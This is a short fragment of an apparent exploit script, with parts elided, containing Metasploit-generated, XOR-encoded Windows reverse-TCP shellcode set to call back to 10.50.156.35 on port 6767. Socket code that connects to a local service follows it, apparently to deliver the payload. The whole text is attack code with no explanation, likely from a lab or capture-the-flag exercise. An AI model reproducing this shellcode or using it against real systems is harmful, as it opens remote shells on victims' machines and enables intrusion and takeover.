...
# windows/shell_reverse_tcp - 370 bytes
# https://metasploit.com/
# Encoder: x86/xor_dynamic
# VERBOSE=false, LHOST=10.50.156.35, LPORT=6767,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5,
# PrependMigrate=false, EXITFUNC=process, CreateSession=true,
# AutoVerifySession=true
buf =  b""
buf += b"\xeb\x23\x5b\x89\xdf\xb0\xe0\xfc\xae\x75\xfd\x89"
buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x58"
buf += b"\x5f\x74\x08\x46\x80\x3e\xe0\x75\xee\xeb\xea\xff"
buf += b"\xe1\xe8\xd8\xff\xff\xff\x92\xe0\x6e\x7a\x10\x92"
...
buf += b"\x6d\x47\x05\xf8\x97\xfa\x98\xa0\x0e\xb1\xfa\x90"
buf += b"\x92\x88\xfd\x1b\x74\xf8\x82\xc4\xc5\xfa\x0b\x37"
...
buf += b"\x81\xe0\xfd\xf8\x92\xc1\x6d\x47\x58\x5f"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",42002))
print s.recv(1024)
